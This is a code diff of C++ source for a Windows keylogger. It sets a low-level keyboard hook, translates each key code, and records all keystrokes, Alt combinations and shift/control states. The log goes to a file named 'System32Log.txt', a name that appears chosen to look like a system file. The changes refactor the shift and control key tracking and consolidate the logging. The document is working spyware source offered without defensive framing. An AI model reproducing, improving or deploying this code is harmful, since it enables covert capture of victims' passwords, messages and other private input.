@@ -7,11 +7,11 @@
 using namespace std;
 
 // TODO
-// Output file for raw vkCodes
+// Output file for raw vkCodes - currently goes to stdout
 // Output file for printable only?
-// output shift key up, caps lock on/off
+// Output control-char as hex?
 // ReleaseHook() ever called?
-// Both shift keys down, releasing one should not change the unshifted
+// Both control keys down, releasing one should not change the uncontrolled
 
 // variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
 // or you will get problems since every function uses this variable.
@@ -24,74 +24,87 @@ KBDLLHOOKSTRUCT kbdStruct;
 // Have to track the shift key status because APIs don't supply consistent result
 bool capslock;
 bool unshifted = 1;
+bool shiftdn;
+bool rshiftdn;
+bool lshiftdn;
+
 bool uncontrolled = 1;
+extern char lastwindow[256];
+
+int shift_control_keyup(int vk, string & key_string);
 int Save(string key_string, char *file);
 int translate(int vk, string & key_string);
-extern char lastwindow[256];
+void set_unshifted();
+
+void set_unshifted() {
+	unshifted = !((rshiftdn || lshiftdn) ^ capslock);
+}
 
 // This is the callback function. Consider it the event that is raised when, in this case, 
 // a key is pressed.
 LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
-	string key_string;
+	string key_string = "";
 	if (nCode >= 0) { // the action is valid: HC_ACTION.
 		if (wParam == WM_KEYDOWN) {
 			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
 			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
-			errno = translate(kbdStruct.vkCode, key_string);
-			// save to file
-			Save(key_string, (char *) "System32Log.txt");
-			cout << kbdStruct.vkCode << '=' << key_string << '\n';
+			errno = translate(kbdStruct.vkCode, key_string); // check errno
 		}
 		else if (wParam == WM_KEYUP) {
 			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
-			switch (kbdStruct.vkCode) {
-				case VK_SHIFT:
-					key_string = "[SHIFT_UP]";
-					unshifted = 1 ^ capslock;
-					Save(key_string, (char *) "System32Log.txt");
-					cout << kbdStruct.vkCode << '=' << key_string << '\n';
-					break;
-				case VK_RSHIFT:
-					key_string = "[RSHIFT_UP]";
-					unshifted = 1 ^ capslock;
-					Save(key_string, (char *) "System32Log.txt");
-					cout << kbdStruct.vkCode << '=' << key_string << '\n';
-					break;
-				case VK_LSHIFT:
-					key_string = "[LSHIFT_UP]";
-					unshifted = 1 ^ capslock;
-					Save(key_string, (char *) "System32Log.txt");
-					cout << kbdStruct.vkCode << '=' << key_string << '\n';
-					break;
-				case VK_CONTROL:
-					key_string = "[VK_CONTROL_UP]";
-					uncontrolled = 1;
-					Save(key_string, (char *) "System32Log.txt");
-					cout << kbdStruct.vkCode << '=' << key_string << '\n';
-					break;
-				case VK_LCONTROL:
-					key_string = "[VK_LCONTROL_UP]";
-					uncontrolled = 1;
-					Save(key_string, (char *) "System32Log.txt");
-					cout << kbdStruct.vkCode << '=' << key_string << '\n';
-					break;
-				case VK_RCONTROL:
-					key_string = "[VK_RCONTROL_UP]";
-					uncontrolled = 1;
-					Save(key_string, (char *) "System32Log.txt");
-					cout << kbdStruct.vkCode << '=' << key_string << '\n';
-					break;
-			}
-			//return 0;
+			errno = shift_control_keyup(kbdStruct.vkCode, key_string); // check errno
 		}
 		else if (wParam == WM_SYSKEYDOWN) {
 			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
-			errno = translate(kbdStruct.vkCode, key_string);
-			Save("[ALT]"+key_string, (char *) "System32Log.txt");
-			cout << kbdStruct.vkCode << '=' << "[ALT]" << key_string << '\n';
+			errno = translate(kbdStruct.vkCode, key_string); // check errno
+			key_string = "[ALT]" + key_string;
+		}
+		else if (wParam == WM_SYSKEYUP) {
+			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
+			errno = shift_control_keyup(kbdStruct.vkCode, key_string); // check errno
+			key_string = "[ALT]" + key_string;
+		}
+		if (key_string != "") { // save to file
+			Save(key_string, (char *) "System32Log.txt");
+			cout << kbdStruct.vkCode << '=' << key_string << '\n';
 		}
 	}
 	return CallNextHookEx(_hook, nCode, wParam, lParam);
+}
+
+int shift_control_keyup(int vk, string & key_string) {
+	switch (vk) {
+	case VK_SHIFT:
+		key_string = "[SHIFT_UP]";
+		shiftdn = 0;
+		set_unshifted();
+		break;
+	case VK_RSHIFT:
+		key_string = "[RSHIFT_UP]";
+		rshiftdn = 0;
+		set_unshifted();
+		break;
+	case VK_LSHIFT:
+		key_string = "[LSHIFT_UP]";
+		lshiftdn = 0;
+		set_unshifted();
+		break;
+	case VK_CONTROL:
+		key_string = "[CONTROL_UP]";
+		uncontrolled = 1;
+		break;
+	case VK_LCONTROL:
+		key_string = "[LCONTROL_UP]";
+		uncontrolled = 1;
+		break;
+	case VK_RCONTROL:
+		key_string = "[RCONTROL_UP]";
+		uncontrolled = 1;
+		break;
+	default:
+		key_string = "";
+	}
+	return 0;
 }
 
 void SetHook() {
@@ -122,11 +135,11 @@ int translate(int vk, string & key_string) {
 	case VK_TAB: key_string = "[TAB]"; break;
 	case VK_CLEAR: key_string = "[CLEAR]"; break;
 	case VK_RETURN: key_string = "[RETURN]\n"; break;
-	case VK_SHIFT: key_string = "[SHIFT_DN]"; unshifted = 0 ^ capslock; break;
+	case VK_SHIFT: key_string = "[SHIFT_DN]"; shiftdn = 1; set_unshifted(); break;
 	case VK_CONTROL: key_string = "[CONTROL_DN]"; uncontrolled = 0; break;
 	case VK_MENU: key_string = "[ALT]"; break;
 	case VK_PAUSE: key_string = "[PAUSE]"; break;
-	case VK_CAPITAL: key_string = "[CAPSLOCK]"; capslock ^= 1; unshifted ^= 1; break;
+	case VK_CAPITAL: key_string = "[CAPSLOCK]"; capslock ^= 1; set_unshifted(); break;
 	case VK_ESCAPE: key_string = "[ESCAPE]"; break;
 	// IME 
 	case VK_SPACE: key_string = " "; break;
@@ -185,8 +198,8 @@ int translate(int vk, string & key_string) {
 	case VK_NUMLOCK: key_string = "[NUMLOCK]"; break;
 	case VK_SCROLL: key_string = "[SCROLLLOCK]"; break;
 	// OEM & unassigned
-	case VK_LSHIFT: key_string = "[LSHIFT_DN]"; unshifted = 0 ^ capslock; break;
-	case VK_RSHIFT: key_string = "[RSHIFT_DN]"; unshifted = 0 ^ capslock; break;
+	case VK_LSHIFT: key_string = "[LSHIFT_DN]"; lshiftdn = 1; set_unshifted(); break;
+	case VK_RSHIFT: key_string = "[RSHIFT_DN]"; rshiftdn = 1; set_unshifted(); break;
 	case VK_LCONTROL: key_string = "[LCONTROL_DN]"; uncontrolled = 0; break;
 	case VK_RCONTROL: key_string = "[RCONTROL_DN]"; uncontrolled = 0; break;
 	case VK_LMENU: key_string = "[LALT]"; break;
